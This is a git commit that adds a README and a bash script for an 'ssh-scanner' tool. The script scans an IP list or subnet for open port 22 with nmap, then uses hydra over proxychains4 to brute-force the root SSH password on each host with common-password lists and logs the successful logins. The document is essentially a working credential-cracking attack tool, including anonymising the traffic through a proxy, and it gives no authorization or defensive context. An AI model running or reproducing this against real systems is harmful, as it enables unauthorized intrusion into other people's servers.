ac92ea5160c01f85849bfb73b2248476aabe3c3b
scu-igroup <qswhs@foxmail.com>
2018-05-03 06:05:09 -0700

    first commit

--- README.md
+++ README.md
@@ -1,2 +1,15 @@
 # ssh-scanner
 ssh password guessing，ssh登录密码破解
+
+### 简介  
+   将nmap扫描器和hydra扫描器组合使用，先探测主机是否开放22端口；如开放，然后暴力破解ssh服务的密码；给出了top 100,1000,10000的常用密码本。  
+
+### 使用条件  
+   Ubuntu 18.04 64bit  
+   sudo apt install nmap hydra
+
+### 运行程序  
+   ./hydra.sh -p ./password.txt -f ./iplist.txt #对文件中的IP进行破解  
+   ./hydra.sh -p ./password.txt -l 192.168.9.0/24 #对网段中的IP进行破解  
+运行图：  
+![Image test](https://github.com/scu-igroup/ssh-scanner/blob/master/image/22-pass.gif) 
---
+++ hydra.sh
@@ -0,0 +1,49 @@
+#!/bin/bash
+
+if [ $# -lt 4 ] 
+then
+   echo "usage: ./hydra.sh -p ./password.txt -f ./iplist.txt"
+   echo "usage: ./hydra.sh -p ./password.txt -l 192.168.9.0/24"
+   exit 1
+fi
+
+while [ -n "$1" ]  
+do  
+  case "$1" in    
+    -p)  
+        passfile=$2
+        #echo $passfile 
+        shift  
+        ;;  
+    -f)  
+        nmap -vv -n -sS -p22 -iL $2  | grep "Discovered open port" | awk {'print $6'} | awk -F/ {'print $1'} > ./22-output.txt
+        shift  
+        ;;  
+    -l)  
+        nmap -vv -n -sS -p22 $2  | grep "Discovered open port" | awk {'print $6'} | awk -F/ {'print $1'} > ./22-output.txt 
+        shift  
+        ;; 
+    *)  
+        echo "$1 is not an option"  
+        echo "usage: ./hydra.sh -p ./password.txt -f ./iplist.txt"
+        echo "usage: ./hydra.sh -p ./password.txt -l 192.168.9.0/24"
+        exit 1
+        ;;  
+  esac  
+  shift  
+done
+
+echo "-----------port scan finished-----------"
+
+chmod 666 ./22-output.txt
+
+#echo `cat ./22-output.txt` 
+
+cat ./22-output.txt | while read line
+do 
+    echo "Current Task: ${line}"
+    proxychains4 hydra -l root -P $passfile -t 6 -vV $line ssh | grep "host:" > hydra.reslut
+done
+
+echo "-------password guessing finished-------"
+
